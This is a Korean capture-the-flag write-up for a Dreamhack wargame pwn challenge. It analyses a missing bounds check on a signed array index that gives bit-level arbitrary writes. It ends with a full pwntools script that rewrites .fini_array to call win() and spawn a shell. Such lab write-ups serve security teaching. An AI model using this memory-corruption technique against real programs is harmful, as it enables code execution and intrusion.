[문제 링크](https://dreamhack.io/wargame/challenges/1211)

## 문제 분석

```
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```



```c
// gcc -o main main.c -Wl,-z,norelro

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

uint64_t arr[64] = {0};

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    for (int i = 0; i < 64; i++)
        arr[i] = 1ul << i;
}

void print_menu() {
    puts("1. XOR two values");
    puts("2. Print one value");
    printf("> ");
}

void xor() {
    int32_t i, j;
    printf("Enter i & j > ");
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}

void print() {
    uint32_t i;
    printf("Enter i > ");
    scanf("%d", &i);
    printf("Value: %lx\n", arr[i]);
}

void win() {
    system("/bin/sh");
}

int main() {
    int option, i, j;

    initialize();
    while (1) {
        print_menu();
        scanf("%d", &option);
        if (option == 1) {
            xor();
        } else if (option == 2) {
            print();
        } else {
            break;
        }
    }

    return 0;
}
```

## 취약점 분석

문제의 핵심 로직은 다음과 같다.

```c
uint64_t arr[64] = {0};

void initialize() {
    for (int i = 0; i < 64; i++)
        arr[i] = 1ul << i;
}

void xor() {
    int32_t i, j;
    printf("Enter i & j > ");
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}
```

- `initialize()` 함수는 `arr` 배열을 1, 2, 4, 8, ... ,2^63 의 값으로 채웁니다. 즉, 배열의 각 인덱스는 정확히 64비트 중 1개의 비트만 켜져 있는 조각이 된다.
- `xor()` 함수에서는 인덱스 `i`와 `j`를 입력받아 `arr[i] ^= arr[j]`를 수행한다. 하지만 **입력값에 대한 경계 검사(Bounds Checking)가 전혀 없다.** 게다가 자료형이 `int32_t`이므로 음수도 입력할 수 있다.

**결론:** 음수 인덱스를 통해 `arr` 배열보다 낮은 주소에 있는 메모리에 접근하여, 특정 비트를 마음대로 껐다 켤 수 있는 **Arbitrary Memory Write (비트 단위)** 취약점이 발생한다.



## 공격 시나리오 수립

### 어디를 공격해야 할까?

공격할때 처음으로 생각할 수 있는 것은 GOT table이다. 하지만 GOT table을 공격하기 위해 루프를 돌면서 비트를 조작하는 도중 `scanf`가 호출되어 프로그램이 터지게 된다. 그렇기 때문에 다른 방법을 생각해야 하는데 그것이 바로 `.fini_array`이다. `.fini_array`는 `main`함수가 완전히 종료된 직후에 단 한 번 실행되므로, 루프를 돌며 비트를 조작한 뒤 안전하게 쉘(`win()`)을 트리거할 수 있다.

### PIE 우회를 위한 공격법

프로그램에 PIE가 켜져있기 때문에 `.fini_array`에 들어있는 함수 주소는 `Random Base + Offset` 형태이다. 

그렇기 때문에 만약 이곳을 0으로 싹 밀어버리고 `win()`의 오프셋(`0x13ed`)만 쓴다면, 베이스 주소가 날아가서 Segmentation Fault가 발생한다.
즉, 베이스 주소(`Random Base`)를 보존한 채 하위 오프셋만 `win()`으로  바꿔야 한다.

xor이 서로 다를 때 `1` 같을 때 `0`을 반환한다는 점을 이용한다면 `.fini_array`의 주소를 `win()`함수의 주소로 변형시킬 수 있다.



## 익스플로잇 코드

```python
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./main')

e = ELF('./main')

arr_addr = e.symbols['arr']
fini_array_addr = e.get_section_by_name('.fini_array').header.sh_addr
win_addr = e.symbols['win']

orig_fini_func = u64(e.read(fini_array_addr, 8))

log.info(f"arr address   : {hex(arr_addr)}")
log.info(f".fini_array   : {hex(fini_array_addr)}")
log.info(f"orig function : {hex(orig_fini_func)}")
log.info(f"win() address : {hex(win_addr)}")

idx = (fini_array_addr - arr_addr) // 8

def do_xor(i, j):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Enter i & j > ", f"{i} {j}".encode())

bits_to_flip = orig_fini_func ^ win_addr

log.info("Flipping required bits to morph into win()...")

for bit in range(64):
    if (bits_to_flip >> bit) & 1:
        do_xor(idx, bit)


p.sendlineafter(b"> ", b"3")

p.interactive()
```







